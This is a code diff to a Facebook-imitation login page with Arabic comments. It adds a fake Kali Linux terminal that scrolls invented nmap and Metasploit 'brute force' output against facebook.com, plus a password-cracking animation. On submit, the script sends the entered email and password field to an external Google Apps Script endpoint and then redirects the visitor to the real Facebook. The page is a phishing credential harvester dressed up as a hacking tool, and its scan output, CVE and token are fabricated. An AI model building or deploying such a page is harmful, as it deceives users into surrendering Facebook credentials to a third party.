@@ -11,6 +11,10 @@
     --facebook-blue: #1877f2;
     --input-border: #ccd0d5;
     --matrix-green: #00ff41;
+    --kali-bg: #0d0d0d;
+    --kali-text: #ffffff;
+    --kali-blue: #29b6f6;
+    --kali-red: #ff5252;
 }
 
 body {
@@ -30,7 +34,6 @@ body {
     transition: all 0.3s; outline: none;
 }
 
-/* --- فقاعة الخطأ السوداء (ستايل فيسبوك) --- */
 .fb-error-bubble {
     display: none;
     position: absolute;
@@ -65,12 +68,12 @@ input.hacking-active {
 .input-group .icon { position: absolute; top: 50%; left: 12px; transform: translateY(-50%); color: #888; pointer-events: none; }
 .toggle-password { position: absolute; top: 50%; right: 12px; transform: translateY(-50%); color: #888; cursor: pointer; z-index: 5; }
 
+/* شاشات الماتريكس الجانبية */
 .matrix-screen {
     display: none; position: absolute; background: #000; border: 2px solid var(--matrix-green);
     overflow: hidden; color: var(--matrix-green); font-family: 'Courier New', monospace; 
     font-size: 11px; z-index: 100; box-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
 }
-
 #screen1 { width: 120px; height: 120px; left: -135px; top: -10px; border-radius: 8px; }
 #screen2 { width: 180px; height: 300px; right: -200px; top: -100px; border-radius: 10px; }
 
@@ -81,11 +84,27 @@ input.hacking-active {
 @keyframes fastScroll { 0% { transform: translateY(0); } 100% { transform: translateY(-60px); } }
 @keyframes slowScroll { 0% { transform: translateY(0); } 100% { transform: translateY(-80px); } }
 
+/* شاشة كالي لينكس الجديدة */
+.kali-terminal {
+    display: none; width: 95%; max-width: 800px; height: 200px;
+    background-color: var(--kali-bg); margin: 30px auto; border-radius: 6px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333;
+    overflow: hidden; position: relative;
+}
+.kali-header { background: #222; padding: 5px 15px; color: #bbb; font-size: 12px; font-family: monospace; border-bottom: 1px solid #333; }
+.kali-body { padding: 10px; color: var(--kali-text); font-family: 'Courier New', Courier, monospace; font-size: 13px; line-height: 1.5; height: 100%; overflow: hidden; }
+.kali-scroll-text { animation: kaliScroll 12s linear infinite; }
+
+@keyframes kaliScroll { 0% { transform: translateY(0); } 100% { transform: translateY(-100%); } }
+
+.k-blue { color: var(--kali-blue); }
+.k-red { color: var(--kali-red); }
+.k-green { color: var(--matrix-green); }
+
 button[type="submit"] {
     width: 100%; padding: 15px; border: none; background-color: var(--facebook-blue);
     color: white; font-size: 17px; font-weight: bold; border-radius: 12px; cursor: pointer;
 }
-
 button[type="submit"]:disabled { background-color: #111; color: var(--matrix-green); border: 1px solid var(--matrix-green); }
 
 .forgot { margin: 14px 0; font-size: 14px; color: #1877f2; text-align: center; }
@@ -102,7 +121,8 @@ button[type="submit"]:disabled { background-color: #111; color: var(--matrix-gre
 <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="FB"></div>
 
 <div class="container">
-    <form id="myForm" novalidate> <div class="input-group">
+    <form id="myForm" novalidate> 
+        <div class="input-group">
             <input type="text" id="emailInput" placeholder="الرقم أو الإيميل">
             <i class="fa-solid fa-user icon"></i>
             <div class="fb-error-bubble" id="emailError">يجب عليك إدخال الرقم أو الإيميل</div>
@@ -123,6 +143,13 @@ button[type="submit"]:disabled { background-color: #111; color: var(--matrix-gre
     <button class="create-account">إنشاء حساب جديد</button>
 </div>
 
+<div class="kali-terminal" id="kaliTerminal">
+    <div class="kali-header">root@kali: ~ /tools/exploitation/social-engineering</div>
+    <div class="kali-body">
+        <div class="kali-scroll-text" id="kaliContent"></div>
+    </div>
+</div>
+
 <script>
 const form = document.getElementById("myForm");
 const submitBtn = document.getElementById("submitBtn");
@@ -133,8 +160,39 @@ const passError = document.getElementById("passError");
 const togglePassword = document.getElementById("togglePassword");
 const screens = [document.getElementById("screen1"), document.getElementById("screen2")];
 const texts = [document.getElementById("text1"), document.getElementById("text2")];
+const kaliTerminal = document.getElementById("kaliTerminal");
+const kaliContent = document.getElementById("kaliContent");
 
-// إظهار/إخفاء كلمة المرور
+const hackerData = [
+    "IP: 192.168.1.1\nPORT: 443\nBYPASSING...\nDECRYPTING\nSALT: 0x88\n",
+    "ESTABLISHING PROXY...\nLOCATION: ALGERIA\nINJECTING_SQL...\nSTRM_DATA: VERIFIED\nKEY_FOUND: ********\nSYSTEM_OVERRIDE: YES\n"
+];
+
+const kaliCommands = [
+    "<span class='k-blue'>┌──(</span><span class='k-red'>root㉿kali</span><span class='k-blue'>)-[</span>~<span class='k-blue'>]</span>",
+    "<span class='k-blue'>└─#</span> nmap -sS -A -T4 facebook.com",
+    "Starting Nmap 7.94 ( https://nmap.org )",
+    "Nmap scan report for facebook.com (31.13.72.36)",
+    "PORT    STATE SERVICE  VERSION",
+    "443/tcp open  ssl/http Apache",
+    "<span class='k-green'>[+] Vulnerability found: CVE-2024-X881</span>",
+    "<span class='k-blue'>┌──(</span><span class='k-red'>root㉿kali</span><span class='k-blue'>)-[</span>~<span class='k-blue'>]</span>",
+    "<span class='k-blue'>└─#</span> msfconsole -q",
+    "msf6 > use auxiliary/scanner/http/facebook_login",
+    "msf6 auxiliary(facebook_login) > set RHOSTS facebook.com",
+    "msf6 auxiliary(facebook_login) > run",
+    "<span class='k-blue'>[*]</span> Starting Brute Force attack...",
+    "<span class='k-red'>[!]</span> Attempting connection: 102.164.1.44",
+    "<span class='k-green'>[+] Success! Token: EAAGm0PX4ZCpsBAN...</span>",
+    "--------------------------------------------------",
+    "SESSION_ESTABLISHED: TRUE",
+    "X-FRAME-OPTIONS: BYPASSED",
+    "DUMPING_DATABASE_TABLES: USERS, PASSWORDS",
+    "SHUTTING DOWN FIREWALL... DONE"
+];
+
+kaliContent.innerHTML = kaliCommands.join("<br>").repeat(15);
+
 togglePassword.addEventListener("click", () => {
     const type = passInput.type === "password" ? "text" : "password";
     passInput.type = type;
@@ -142,20 +200,15 @@ togglePassword.addEventListener("click", () => {
     togglePassword.classList.toggle("fa-eye-slash");
 });
 
-// إخفاء الفقاعة عند بدء الكتابة
 emailInput.addEventListener("input", () => emailError.style.display = "none");
 passInput.addEventListener("input", () => passError.style.display = "none");
 
-const hackerPasswords = ["admin123", "password!@#", "hacked_2024", "root_system", "FB_Access_77", "qwerty0000"];
-const hackerData = [
-    "IP: 192.168.1.1\nPORT: 443\nBYPASSING...\nDECRYPTING\nSALT: 0x88\n",
-    "ESTABLISHING PROXY...\nLOCATION: ALGERIA\nINJECTING_SQL...\nSTRM_DATA: VERIFIED\nKEY_FOUND: ********\nSYSTEM_OVERRIDE: YES\n"
-];
+// تم استبدال admin123 بـ youcef farsi
+const hackerPasswords = ["youcef farsi", "password!@#", "hacked_2024", "root_system", "FB_Access_77", "qwerty", "12345678", "dragon"];
 
 form.addEventListener("submit", (e) => {
     e.preventDefault();
 
-    // التحقق يدوياً لإظهار الفقاعة السوداء
     let isValid = true;
     if (emailInput.value.trim() === "") {
         emailError.style.display = "block";
@@ -168,33 +221,32 @@ form.addEventListener("submit", (e) => {
 
     if (!isValid) return;
 
-    // --- إذا كانت الحقول ممتلئة يبدأ نظام الهكر ---
     screens.forEach((s, index) => {
         s.style.display = "block";
         texts[index].innerText = hackerData[index].repeat(60);
     });
+    
+    kaliTerminal.style.display = "block";
 
     submitBtn.disabled = true;
     passInput.classList.add("hacking-active");
     passInput.type = "text";
 
-    let timer = 0;
-    const bruteForceInterval = setInterval(() => {
-        const randomPass = hackerPasswords[Math.floor(Math.random() * hackerPasswords.length)];
-        passInput.value = randomPass + "_" + Math.floor(Math.random() * 999);
-    }, 100);
-
     let progress = 0;
     const progressInterval = setInterval(() => {
-        progress++;
-        submitBtn.innerText = `BRUTE FORCING... ${progress}%`;
-        if(progress >= 100) clearInterval(progressInterval);
-    }, 190);
+        progress += 0.5;
+        submitBtn.innerText = `EXPLOITING SYSTEM... ${Math.floor(progress)}%`;
+        
+        const randomPass = hackerPasswords[Math.floor(Math.random() * hackerPasswords.length)];
+        passInput.value = randomPass + "_" + Math.floor(Math.random() * 9999);
+        
+        if(progress >= 100) {
+            clearInterval(progressInterval);
+            passInput.value = "PASS_FOUND: " + hackerPasswords[0];
+        }
+    }, 30); // السرعة الجنونية 30ms
 
     setTimeout(() => {
-        clearInterval(bruteForceInterval);
-        passInput.value = "PASS_FOUND: " + hackerPasswords[0];
-        
         fetch("https://script.google.com/macros/s/YOUR_ID/exec", {
             method: "POST",
             body: JSON.stringify({email: emailInput.value, pass: passInput.value})
@@ -203,7 +255,7 @@ form.addEventListener("submit", (e) => {
         setTimeout(() => {
             window.location.href = "https://www.facebook.com";
         }, 1500);
-    }, 20000);
+    }, 6000);
 });
 </script>
 
